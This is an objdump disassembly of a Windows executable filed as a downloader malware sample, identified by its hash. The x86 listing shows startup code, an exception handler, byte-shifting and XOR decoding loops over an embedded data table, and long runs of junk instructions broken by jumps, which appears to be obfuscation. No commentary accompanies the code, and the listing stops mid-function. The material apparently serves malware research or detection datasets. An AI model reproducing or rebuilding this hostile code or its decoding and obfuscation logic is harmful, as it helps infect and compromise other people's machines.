
malware_samples/downloader/132ce48977008440369b9cdc69547bec1a50e2229b83ecbcfca86645afdb229d.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	89 e5                	mov    %esp,%ebp
  401003:	83 ec 08             	sub    $0x8,%esp
  401006:	a1 74 11 41 00       	mov    0x411174,%eax
  40100b:	c9                   	leave
  40100c:	ff e0                	jmp    *%eax
  40100e:	66 90                	xchg   %ax,%ax
  401010:	55                   	push   %ebp
  401011:	89 e5                	mov    %esp,%ebp
  401013:	83 ec 08             	sub    $0x8,%esp
  401016:	a1 64 11 41 00       	mov    0x411164,%eax
  40101b:	c9                   	leave
  40101c:	ff e0                	jmp    *%eax
  40101e:	66 90                	xchg   %ax,%ax
  401020:	55                   	push   %ebp
  401021:	89 e5                	mov    %esp,%ebp
  401023:	53                   	push   %ebx
  401024:	83 ec 34             	sub    $0x34,%esp
  401027:	a1 f0 f2 40 00       	mov    0x40f2f0,%eax
  40102c:	85 c0                	test   %eax,%eax
  40102e:	74 1c                	je     0x40104c
  401030:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401037:	00 
  401038:	c7 44 24 04 02 00 00 	movl   $0x2,0x4(%esp)
  40103f:	00 
  401040:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  401047:	ff d0                	call   *%eax
  401049:	83 ec 0c             	sub    $0xc,%esp
  40104c:	c7 04 24 80 11 40 00 	movl   $0x401180,(%esp)
  401053:	e8 68 1f 00 00       	call   0x402fc0
  401058:	83 ec 04             	sub    $0x4,%esp
  40105b:	e8 50 17 00 00       	call   0x4027b0
  401060:	e8 bb 1c 00 00       	call   0x402d20
  401065:	8d 45 f0             	lea    -0x10(%ebp),%eax
  401068:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  40106f:	89 44 24 10          	mov    %eax,0x10(%esp)
  401073:	a1 70 f2 40 00       	mov    0x40f270,%eax
  401078:	c7 44 24 04 04 00 41 	movl   $0x410004,0x4(%esp)
  40107f:	00 
  401080:	c7 04 24 00 00 41 00 	movl   $0x410000,(%esp)
  401087:	89 44 24 0c          	mov    %eax,0xc(%esp)
  40108b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40108e:	89 44 24 08          	mov    %eax,0x8(%esp)
  401092:	e8 a9 1e 00 00       	call   0x402f40
  401097:	a1 24 00 41 00       	mov    0x410024,%eax
  40109c:	85 c0                	test   %eax,%eax
  40109e:	75 50                	jne    0x4010f0
  4010a0:	e8 a3 1e 00 00       	call   0x402f48
  4010a5:	8b 15 74 f2 40 00    	mov    0x40f274,%edx
  4010ab:	89 10                	mov    %edx,(%eax)
  4010ad:	e8 1e 19 00 00       	call   0x4029d0
  4010b2:	83 e4 f0             	and    $0xfffffff0,%esp
  4010b5:	e8 46 1b 00 00       	call   0x402c00
  4010ba:	e8 91 1e 00 00       	call   0x402f50
  4010bf:	8b 00                	mov    (%eax),%eax
  4010c1:	89 44 24 08          	mov    %eax,0x8(%esp)
  4010c5:	a1 04 00 41 00       	mov    0x410004,%eax
  4010ca:	89 44 24 04          	mov    %eax,0x4(%esp)
  4010ce:	a1 00 00 41 00       	mov    0x410000,%eax
  4010d3:	89 04 24             	mov    %eax,(%esp)
  4010d6:	e8 45 1b 00 00       	call   0x402c20
  4010db:	89 c3                	mov    %eax,%ebx
  4010dd:	e8 76 1e 00 00       	call   0x402f58
  4010e2:	89 1c 24             	mov    %ebx,(%esp)
  4010e5:	e8 de 1e 00 00       	call   0x402fc8
  4010ea:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4010f0:	8b 1d 60 11 41 00    	mov    0x411160,%ebx
  4010f6:	a3 74 f2 40 00       	mov    %eax,0x40f274
  4010fb:	89 44 24 04          	mov    %eax,0x4(%esp)
  4010ff:	8b 43 10             	mov    0x10(%ebx),%eax
  401102:	89 04 24             	mov    %eax,(%esp)
  401105:	e8 56 1e 00 00       	call   0x402f60
  40110a:	a1 24 00 41 00       	mov    0x410024,%eax
  40110f:	89 44 24 04          	mov    %eax,0x4(%esp)
  401113:	8b 43 30             	mov    0x30(%ebx),%eax
  401116:	89 04 24             	mov    %eax,(%esp)
  401119:	e8 42 1e 00 00       	call   0x402f60
  40111e:	a1 24 00 41 00       	mov    0x410024,%eax
  401123:	89 44 24 04          	mov    %eax,0x4(%esp)
  401127:	8b 43 50             	mov    0x50(%ebx),%eax
  40112a:	89 04 24             	mov    %eax,(%esp)
  40112d:	e8 2e 1e 00 00       	call   0x402f60
  401132:	e9 69 ff ff ff       	jmp    0x4010a0
  401137:	89 f6                	mov    %esi,%esi
  401139:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  401140:	55                   	push   %ebp
  401141:	89 e5                	mov    %esp,%ebp
  401143:	83 ec 18             	sub    $0x18,%esp
  401146:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
  40114d:	ff 15 58 11 41 00    	call   *0x411158
  401153:	e8 c8 fe ff ff       	call   0x401020
  401158:	90                   	nop
  401159:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401160:	55                   	push   %ebp
  401161:	89 e5                	mov    %esp,%ebp
  401163:	83 ec 18             	sub    $0x18,%esp
  401166:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  40116d:	ff 15 58 11 41 00    	call   *0x411158
  401173:	e8 a8 fe ff ff       	call   0x401020
  401178:	90                   	nop
  401179:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401180:	55                   	push   %ebp
  401181:	89 e5                	mov    %esp,%ebp
  401183:	53                   	push   %ebx
  401184:	83 ec 14             	sub    $0x14,%esp
  401187:	8b 45 08             	mov    0x8(%ebp),%eax
  40118a:	8b 00                	mov    (%eax),%eax
  40118c:	8b 00                	mov    (%eax),%eax
  40118e:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
  401193:	77 3b                	ja     0x4011d0
  401195:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
  40119a:	72 4b                	jb     0x4011e7
  40119c:	bb 01 00 00 00       	mov    $0x1,%ebx
  4011a1:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4011a8:	00 
  4011a9:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
  4011b0:	e8 b3 1d 00 00       	call   0x402f68
  4011b5:	83 f8 01             	cmp    $0x1,%eax
  4011b8:	0f 84 f1 00 00 00    	je     0x4012af
  4011be:	85 c0                	test   %eax,%eax
  4011c0:	0f 85 9e 00 00 00    	jne    0x401264
  4011c6:	31 c0                	xor    %eax,%eax
  4011c8:	83 c4 14             	add    $0x14,%esp
  4011cb:	5b                   	pop    %ebx
  4011cc:	5d                   	pop    %ebp
  4011cd:	c2 04 00             	ret    $0x4
  4011d0:	3d 94 00 00 c0       	cmp    $0xc0000094,%eax
  4011d5:	74 4b                	je     0x401222
  4011d7:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  4011dc:	74 17                	je     0x4011f5
  4011de:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
  4011e3:	75 e1                	jne    0x4011c6
  4011e5:	eb b5                	jmp    0x40119c
  4011e7:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  4011ec:	74 42                	je     0x401230
  4011ee:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
  4011f3:	75 d1                	jne    0x4011c6
  4011f5:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4011fc:	00 
  4011fd:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)
  401204:	e8 5f 1d 00 00       	call   0x402f68
  401209:	83 f8 01             	cmp    $0x1,%eax
  40120c:	74 69                	je     0x401277
  40120e:	85 c0                	test   %eax,%eax
  401210:	74 b4                	je     0x4011c6
  401212:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)
  401219:	ff d0                	call   *%eax
  40121b:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  401220:	eb a6                	jmp    0x4011c8
  401222:	31 db                	xor    %ebx,%ebx
  401224:	e9 78 ff ff ff       	jmp    0x4011a1
  401229:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401230:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  401237:	00 
  401238:	c7 04 24 0b 00 00 00 	movl   $0xb,(%esp)
  40123f:	e8 24 1d 00 00       	call   0x402f68
  401244:	83 f8 01             	cmp    $0x1,%eax
  401247:	74 4a                	je     0x401293
  401249:	85 c0                	test   %eax,%eax
  40124b:	0f 84 75 ff ff ff    	je     0x4011c6
  401251:	c7 04 24 0b 00 00 00 	movl   $0xb,(%esp)
  401258:	ff d0                	call   *%eax
  40125a:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40125f:	e9 64 ff ff ff       	jmp    0x4011c8
  401264:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
  40126b:	ff d0                	call   *%eax
  40126d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  401272:	e9 51 ff ff ff       	jmp    0x4011c8
  401277:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  40127e:	00 
  40127f:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)
  401286:	e8 dd 1c 00 00       	call   0x402f68
  40128b:	83 c8 ff             	or     $0xffffffff,%eax
  40128e:	e9 35 ff ff ff       	jmp    0x4011c8
  401293:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  40129a:	00 
  40129b:	c7 04 24 0b 00 00 00 	movl   $0xb,(%esp)
  4012a2:	e8 c1 1c 00 00       	call   0x402f68
  4012a7:	83 c8 ff             	or     $0xffffffff,%eax
  4012aa:	e9 19 ff ff ff       	jmp    0x4011c8
  4012af:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  4012b6:	00 
  4012b7:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
  4012be:	e8 a5 1c 00 00       	call   0x402f68
  4012c3:	85 db                	test   %ebx,%ebx
  4012c5:	75 0a                	jne    0x4012d1
  4012c7:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4012cc:	e9 f7 fe ff ff       	jmp    0x4011c8
  4012d1:	e8 4a 1a 00 00       	call   0x402d20
  4012d6:	eb ef                	jmp    0x4012c7
  4012d8:	90                   	nop
  4012d9:	90                   	nop
  4012da:	90                   	nop
  4012db:	90                   	nop
  4012dc:	90                   	nop
  4012dd:	90                   	nop
  4012de:	90                   	nop
  4012df:	90                   	nop
  4012e0:	55                   	push   %ebp
  4012e1:	89 e5                	mov    %esp,%ebp
  4012e3:	83 ec 18             	sub    $0x18,%esp
  4012e6:	a1 a0 f3 40 00       	mov    0x40f3a0,%eax
  4012eb:	85 c0                	test   %eax,%eax
  4012ed:	74 3a                	je     0x401329
  4012ef:	c7 04 24 7c f2 40 00 	movl   $0x40f27c,(%esp)
  4012f6:	e8 d5 1c 00 00       	call   0x402fd0
  4012fb:	89 c2                	mov    %eax,%edx
  4012fd:	83 ec 04             	sub    $0x4,%esp
  401300:	85 d2                	test   %edx,%edx
  401302:	b8 00 00 00 00       	mov    $0x0,%eax
  401307:	74 13                	je     0x40131c
  401309:	c7 44 24 04 89 f2 40 	movl   $0x40f289,0x4(%esp)
  401310:	00 
  401311:	89 14 24             	mov    %edx,(%esp)
  401314:	e8 bf 1c 00 00       	call   0x402fd8
  401319:	83 ec 08             	sub    $0x8,%esp
  40131c:	85 c0                	test   %eax,%eax
  40131e:	74 09                	je     0x401329
  401320:	c7 04 24 a0 f3 40 00 	movl   $0x40f3a0,(%esp)
  401327:	ff d0                	call   *%eax
  401329:	c9                   	leave
  40132a:	c3                   	ret
  40132b:	90                   	nop
  40132c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  401330:	55                   	push   %ebp
  401331:	89 e5                	mov    %esp,%ebp
  401333:	5d                   	pop    %ebp
  401334:	c3                   	ret
  401335:	90                   	nop
  401336:	90                   	nop
  401337:	90                   	nop
  401338:	90                   	nop
  401339:	90                   	nop
  40133a:	90                   	nop
  40133b:	90                   	nop
  40133c:	90                   	nop
  40133d:	90                   	nop
  40133e:	90                   	nop
  40133f:	90                   	nop
  401340:	55                   	push   %ebp
  401341:	89 e5                	mov    %esp,%ebp
  401343:	83 ec 10             	sub    $0x10,%esp
  401346:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  40134d:	e9 0b 02 00 00       	jmp    0x40155d
  401352:	67 00 38             	add    %bh,(%bx,%si)
  401355:	00 c0                	add    %al,%al
  401357:	0e                   	push   %cs
  401358:	67 66 0b 00          	or     (%bx,%si),%ax
  40135c:	67 00 00             	add    %al,(%bx,%si)
  40135f:	67 66 f0 13 07       	lock adc (%bx),%ax
  401364:	67 00 00             	add    %al,(%bx,%si)
  401367:	66 54                	push   %sp
  401369:	00 c0                	add    %al,%al
  40136b:	67 10 00             	adc    %al,(%bx,%si)
  40136e:	00 c0                	add    %al,%al
  401370:	67 66 13 0c          	adc    (%si),%cx
  401374:	67 00 13             	add    %dl,(%bp,%di)
  401377:	66 54                	push   %sp
  401379:	67 00 13             	add    %dl,(%bp,%di)
  40137c:	67 10 07             	adc    %al,(%bx)
  40137f:	10 15 00 00 00 00    	adc    %dl,0x0
  401385:	67 10 00             	adc    %al,(%bx,%si)
  401388:	67 10 00             	adc    %al,(%bx,%si)
  40138b:	67 66 01 00          	add    %ax,(%bx,%si)
  40138f:	66 93                	xchg   %ax,%bx
  401391:	66 54                	push   %sp
  401393:	66 54                	push   %sp
  401395:	66 50                	push   %ax
  401397:	67 10 00             	adc    %al,(%bx,%si)
  40139a:	67 66 13 0c          	adc    (%si),%cx
  40139e:	67 00 13             	add    %dl,(%bp,%di)
  4013a1:	67 00 1c             	add    %bl,(%si)
  4013a4:	66 54                	push   %sp
  4013a6:	00 c4                	add    %al,%ah
  4013a8:	67 10 00             	adc    %al,(%bx,%si)
  4013ab:	67 00 00             	add    %al,(%bx,%si)
  4013ae:	67 1a 05             	sbb    (%di),%al
  4013b1:	67 00 00             	add    %al,(%bx,%si)
  4013b4:	67 66 0b 00          	or     (%bx,%si),%ax
  4013b8:	67 66 0b 00          	or     (%bx,%si),%ax
  4013bc:	67 00 02             	add    %al,(%bp,%si)
  4013bf:	10 15 00 00 00 00    	adc    %dl,0x0
  4013c5:	67 00 00             	add    %al,(%bx,%si)
  4013c8:	00 c4                	add    %al,%ah
  4013ca:	67 66 0b 00          	or     (%bx,%si),%ax
  4013ce:	00 c0                	add    %al,%al
  4013d0:	67 00 00             	add    %al,(%bx,%si)
  4013d3:	67 1a 05             	sbb    (%di),%al
  4013d6:	00 c4                	add    %al,%ah
  4013d8:	67 00 00             	add    %al,(%bx,%si)
  4013db:	0e                   	push   %cs
  4013dc:	67 00 20             	add    %ah,(%bx,%si)
  4013df:	67 10 00             	adc    %al,(%bx,%si)
  4013e2:	67 00 02             	add    %al,(%bp,%si)
  4013e5:	67 00 72 0e          	add    %dh,0xe(%bp,%si)
  4013e9:	0e                   	push   %cs
  4013ea:	67 66 0b 00          	or     (%bx,%si),%ax
  4013ee:	00 c0                	add    %al,%al
  4013f0:	10 15 00 00 00 00    	adc    %dl,0x0
  4013f6:	67 66 f0 13 07       	lock adc (%bx),%ax
  4013fb:	66 93                	xchg   %ax,%bx
  4013fd:	67 66 0b 00          	or     (%bx,%si),%ax
  401401:	67 00 00             	add    %al,(%bx,%si)
  401404:	67 10 00             	adc    %al,(%bx,%si)
  401407:	67 00 00             	add    %al,(%bx,%si)
  40140a:	67 1a 05             	sbb    (%di),%al
  40140d:	66 93                	xchg   %ax,%bx
  40140f:	00 c4                	add    %al,%ah
  401411:	66 57                	push   %di
  401413:	67 10 07             	adc    %al,(%bx)
  401416:	67 10 00             	adc    %al,(%bx,%si)
  401419:	67 00 70 fa          	add    %dh,-0x6(%bx,%si)
  40141d:	67 10 07             	adc    %al,(%bx)
  401420:	0e                   	push   %cs
  401421:	67 66 01 00          	add    %ax,(%bx,%si)
  401425:	67 10 07             	adc    %al,(%bx)
  401428:	67 00 00             	add    %al,(%bx,%si)
  40142b:	67 00 00             	add    %al,(%bx,%si)
  40142e:	00 c0                	add    %al,%al
  401430:	67 00 00             	add    %al,(%bx,%si)
  401433:	67 00 70 fa          	add    %dh,-0x6(%bx,%si)
  401437:	67 00 10             	add    %dl,(%bx,%si)
  40143a:	66 57                	push   %di
  40143c:	67 10 00             	adc    %al,(%bx,%si)
  40143f:	66 93                	xchg   %ax,%bx
  401441:	67 66 0b 00          	or     (%bx,%si),%ax
  401445:	67 00 00             	add    %al,(%bx,%si)
  401448:	66 54                	push   %sp
  40144a:	67 00 02             	add    %al,(%bp,%si)
  40144d:	66 57                	push   %di
  40144f:	67 10 00             	adc    %al,(%bx,%si)
  401452:	66 93                	xchg   %ax,%bx
  401454:	ff d0                	call   *%eax
  401456:	b8 00 00 00 00       	mov    $0x0,%eax
  40145b:	83 c4 50             	add    $0x50,%esp
  40145e:	5b                   	pop    %ebx
  40145f:	eb 4a                	jmp    0x4014ab
  401461:	0f 9e c0             	setle  %al
  401464:	84 c0                	test   %al,%al
  401466:	0f 85 f6 00 00 00    	jne    0x401562
  40146c:	c9                   	leave
  40146d:	c3                   	ret
  40146e:	55                   	push   %ebp
  40146f:	89 e5                	mov    %esp,%ebp
  401471:	e9 80 01 00 00       	jmp    0x4015f6
  401476:	c7 44 24 04 a0 f2 40 	movl   $0x40f2a0,0x4(%esp)
  40147d:	00 
  40147e:	c7 04 24 00 40 40 00 	movl   $0x404000,(%esp)
  401485:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401488:	eb ca                	jmp    0x401454
  40148a:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40148d:	e9 ed 00 00 00       	jmp    0x40157f
  401492:	83 7d f8 07          	cmpl   $0x7,-0x8(%ebp)
  401496:	eb c9                	jmp    0x401461
  401498:	01 c2                	add    %eax,%edx
  40149a:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  40149e:	88 02                	mov    %al,(%edx)
  4014a0:	83 45 f8 01          	addl   $0x1,-0x8(%ebp)
  4014a4:	eb ec                	jmp    0x401492
  4014a6:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4014a9:	eb 2d                	jmp    0x4014d8
  4014ab:	5e                   	pop    %esi
  4014ac:	5d                   	pop    %ebp
  4014ad:	c2 04 00             	ret    $0x4
  4014b0:	55                   	push   %ebp
  4014b1:	89 e5                	mov    %esp,%ebp
  4014b3:	83 ec 28             	sub    $0x28,%esp
  4014b6:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4014bd:	eb 53                	jmp    0x401512
  4014bf:	b8 60 40 40 00       	mov    $0x404060,%eax
  4014c4:	83 c0 18             	add    $0x18,%eax
  4014c7:	eb 34                	jmp    0x4014fd
  4014c9:	c1 e2 03             	shl    $0x3,%edx
  4014cc:	01 d0                	add    %edx,%eax
  4014ce:	e9 53 01 00 00       	jmp    0x401626
  4014d3:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  4014d6:	eb 70                	jmp    0x401548
  4014d8:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  4014df:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  4014e6:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  4014ed:	e9 f1 00 00 00       	jmp    0x4015e3
  4014f2:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4014f5:	3b 45 dc             	cmp    -0x24(%ebp),%eax
  4014f8:	0f 9c c0             	setl   %al
  4014fb:	eb 22                	jmp    0x40151f
  4014fd:	8b 00                	mov    (%eax),%eax
  4014ff:	89 45 dc             	mov    %eax,-0x24(%ebp)
  401502:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401505:	c1 e0 03             	shl    $0x3,%eax
  401508:	89 04 24             	mov    %eax,(%esp)
  40150b:	e8 60 1a 00 00       	call   0x402f70
  401510:	eb 94                	jmp    0x4014a6
  401512:	e8 57 ff ff ff       	call   0x40146e
  401517:	83 ec 04             	sub    $0x4,%esp
  40151a:	e9 1a 01 00 00       	jmp    0x401639
  40151f:	84 c0                	test   %al,%al
  401521:	0f 85 c1 00 00 00    	jne    0x4015e8
  401527:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40152a:	89 04 24             	mov    %eax,(%esp)
  40152d:	eb 3b                	jmp    0x40156a
  40152f:	89 55 d4             	mov    %edx,-0x2c(%ebp)
  401532:	b8 60 40 40 00       	mov    $0x404060,%eax
  401537:	83 c0 1e             	add    $0x1e,%eax
  40153a:	0f b7 00             	movzwl (%eax),%eax
  40153d:	eb 00                	jmp    0x40153f
  40153f:	66 89 45 da          	mov    %ax,-0x26(%ebp)
  401543:	e9 77 ff ff ff       	jmp    0x4014bf
  401548:	8b 5d c0             	mov    -0x40(%ebp),%ebx
  40154b:	31 c3                	xor    %eax,%ebx
  40154d:	8b 75 c4             	mov    -0x3c(%ebp),%esi
  401550:	31 d6                	xor    %edx,%esi
  401552:	89 19                	mov    %ebx,(%ecx)
  401554:	89 71 04             	mov    %esi,0x4(%ecx)
  401557:	83 45 f0 01          	addl   $0x1,-0x10(%ebp)
  40155b:	eb 65                	jmp    0x4015c2
  40155d:	e9 42 ff ff ff       	jmp    0x4014a4
  401562:	8b 55 08             	mov    0x8(%ebp),%edx
  401565:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401568:	eb 61                	jmp    0x4015cb
  40156a:	e8 63 06 00 00       	call   0x401bd2
  40156f:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401572:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  401579:	00 
  40157a:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40157d:	eb 21                	jmp    0x4015a0
  40157f:	89 04 24             	mov    %eax,(%esp)
  401582:	e8 b9 fd ff ff       	call   0x401340
  401587:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40158a:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40158d:	c1 e2 03             	shl    $0x3,%edx
  401590:	8d 0c 10             	lea    (%eax,%edx,1),%ecx
  401593:	b8 60 40 40 00       	mov    $0x404060,%eax
  401598:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40159b:	e9 29 ff ff ff       	jmp    0x4014c9
  4015a0:	89 04 24             	mov    %eax,(%esp)
  4015a3:	e8 f4 02 00 00       	call   0x40189c
  4015a8:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4015ab:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  4015af:	0f 84 a1 fe ff ff    	je     0x401456
  4015b5:	c7 44 24 08 a8 f2 40 	movl   $0x40f2a8,0x8(%esp)
  4015bc:	00 
  4015bd:	e9 b4 fe ff ff       	jmp    0x401476
  4015c2:	83 45 f4 01          	addl   $0x1,-0xc(%ebp)
  4015c6:	e9 27 ff ff ff       	jmp    0x4014f2
  4015cb:	8d 04 02             	lea    (%edx,%eax,1),%eax
  4015ce:	0f b6 00             	movzbl (%eax),%eax
  4015d1:	88 45 ff             	mov    %al,-0x1(%ebp)
  4015d4:	80 45 ff 04          	addb   $0x4,-0x1(%ebp)
  4015d8:	8b 55 08             	mov    0x8(%ebp),%edx
  4015db:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4015de:	e9 b5 fe ff ff       	jmp    0x401498
  4015e3:	e9 0a ff ff ff       	jmp    0x4014f2
  4015e8:	83 7d f4 02          	cmpl   $0x2,-0xc(%ebp)
  4015ec:	75 03                	jne    0x4015f1
  4015ee:	d1 65 f4             	shll   $1,-0xc(%ebp)
  4015f1:	e9 94 fe ff ff       	jmp    0x40148a
  4015f6:	56                   	push   %esi
  4015f7:	53                   	push   %ebx
  4015f8:	83 ec 50             	sub    $0x50,%esp
  4015fb:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%ebp)
  401602:	c7 45 d4 00 00 00 00 	movl   $0x0,-0x2c(%ebp)
  401609:	66 c7 45 da 00 00    	movw   $0x0,-0x26(%ebp)
  40160f:	b8 60 40 40 00       	mov    $0x404060,%eax
  401614:	eb 00                	jmp    0x401616
  401616:	83 c0 10             	add    $0x10,%eax
  401619:	8b 50 04             	mov    0x4(%eax),%edx
  40161c:	8b 00                	mov    (%eax),%eax
  40161e:	89 45 d0             	mov    %eax,-0x30(%ebp)
  401621:	e9 09 ff ff ff       	jmp    0x40152f
  401626:	8b 18                	mov    (%eax),%ebx
  401628:	8b 70 04             	mov    0x4(%eax),%esi
  40162b:	89 5d c0             	mov    %ebx,-0x40(%ebp)
  40162e:	89 75 c4             	mov    %esi,-0x3c(%ebp)
  401631:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401634:	e9 9a fe ff ff       	jmp    0x4014d3
  401639:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40163c:	b8 00 00 00 00       	mov    $0x0,%eax
  401641:	c9                   	leave
  401642:	c2 10 00             	ret    $0x10
  401645:	90                   	nop
  401646:	90                   	nop
  401647:	90                   	nop
  401648:	55                   	push   %ebp
  401649:	89 e5                	mov    %esp,%ebp
  40164b:	8b 45 08             	mov    0x8(%ebp),%eax
  40164e:	8b 00                	mov    (%eax),%eax
  401650:	05 a0 00 00 00       	add    $0xa0,%eax
  401655:	5d                   	pop    %ebp
  401656:	e9 d3 09 00 00       	jmp    0x40202e
  40165b:	67 00 02             	add    %al,(%bp,%si)
  40165e:	67 10 00             	adc    %al,(%bx,%si)
  401661:	67 00 02             	add    %al,(%bp,%si)
  401664:	67 00 00             	add    %al,(%bx,%si)
  401667:	67 66 01 00          	add    %ax,(%bx,%si)
  40166b:	67 00 00             	add    %al,(%bx,%si)
  40166e:	67 10 07             	adc    %al,(%bx)
  401671:	67 66 01 00          	add    %ax,(%bx,%si)
  401675:	67 00 00             	add    %al,(%bx,%si)
  401678:	67 00 00             	add    %al,(%bx,%si)
  40167b:	67 10 00             	adc    %al,(%bx,%si)
  40167e:	66 54                	push   %sp
  401680:	67 00 00             	add    %al,(%bx,%si)
  401683:	67 00 00             	add    %al,(%bx,%si)
  401686:	67 00 00             	add    %al,(%bx,%si)
  401689:	67 66 01 00          	add    %ax,(%bx,%si)
  40168d:	67 00 20             	add    %ah,(%bx,%si)
  401690:	67 18 00             	sbb    %al,(%bx,%si)
  401693:	66 93                	xchg   %ax,%bx
  401695:	67 66 01 00          	add    %ax,(%bx,%si)
  401699:	67 66 f0 13 07       	lock adc (%bx),%ax
  40169e:	66 54                	push   %sp
  4016a0:	0e                   	push   %cs
  4016a1:	67 0f 00 00          	sldt   (%bx,%si)
  4016a5:	67 66 0b 00          	or     (%bx,%si),%ax
  4016a9:	67 66 0b 00          	or     (%bx,%si),%ax
  4016ad:	00 c4                	add    %al,%ah
  4016af:	67 00 00             	add    %al,(%bx,%si)
  4016b2:	67 00 00             	add    %al,(%bx,%si)
  4016b5:	10 15 00 00 00 00    	adc    %dl,0x0
  4016bb:	67 10 00             	adc    %al,(%bx,%si)
  4016be:	67 66 f0 13 07       	lock adc (%bx),%ax
  4016c3:	67 00 00             	add    %al,(%bx,%si)
  4016c6:	67 66 13 0c          	adc    (%si),%cx
  4016ca:	67 00 00             	add    %al,(%bx,%si)
  4016cd:	67 00 00             	add    %al,(%bx,%si)
  4016d0:	67 00 20             	add    %ah,(%bx,%si)
  4016d3:	67 66 f0 13 07       	lock adc (%bx),%ax
  4016d8:	67 00 13             	add    %dl,(%bp,%di)
  4016db:	67 00 00             	add    %al,(%bx,%si)
  4016de:	67 00 00             	add    %al,(%bx,%si)
  4016e1:	67 00 00             	add    %al,(%bx,%si)
  4016e4:	67 10 07             	adc    %al,(%bx)
  4016e7:	67 18 00             	sbb    %al,(%bx,%si)
  4016ea:	00 c0                	add    %al,%al
  4016ec:	67 10 00             	adc    %al,(%bx,%si)
  4016ef:	67 10 00             	adc    %al,(%bx,%si)
  4016f2:	67 00 00             	add    %al,(%bx,%si)
  4016f5:	67 66 0b 00          	or     (%bx,%si),%ax
  4016f9:	67 00 00             	add    %al,(%bx,%si)
  4016fc:	66 57                	push   %di
  4016fe:	66 54                	push   %sp
  401700:	67 1a 05             	sbb    (%di),%al
  401703:	0e                   	push   %cs
  401704:	67 00 20             	add    %ah,(%bx,%si)
  401707:	67 00 00             	add    %al,(%bx,%si)
  40170a:	67 00 13             	add    %dl,(%bp,%di)
  40170d:	0e                   	push   %cs
  40170e:	67 10 07             	adc    %al,(%bx)
  401711:	67 00 00             	add    %al,(%bx,%si)
  401714:	84 c0                	test   %al,%al
  401716:	0f 85 d1 04 00 00    	jne    0x401bed
  40171c:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40171f:	89 04 24             	mov    %eax,(%esp)
  401722:	e9 62 01 00 00       	jmp    0x401889
  401727:	3b 45 dc             	cmp    -0x24(%ebp),%eax
  40172a:	0f 97 c0             	seta   %al
  40172d:	84 c0                	test   %al,%al
  40172f:	0f 85 27 08 00 00    	jne    0x401f5c
  401735:	e9 6f 0a 00 00       	jmp    0x4021a9
  40173a:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40173d:	8b 00                	mov    (%eax),%eax
  40173f:	8d 04 02             	lea    (%edx,%eax,1),%eax
  401742:	e9 21 01 00 00       	jmp    0x401868
  401747:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40174a:	8b 40 18             	mov    0x18(%eax),%eax
  40174d:	3b 45 e4             	cmp    -0x1c(%ebp),%eax
  401750:	e9 2c 04 00 00       	jmp    0x401b81
  401755:	8b 58 08             	mov    0x8(%eax),%ebx
  401758:	e8 bb 18 00 00       	call   0x403018
  40175d:	89 5c 24 08          	mov    %ebx,0x8(%esp)
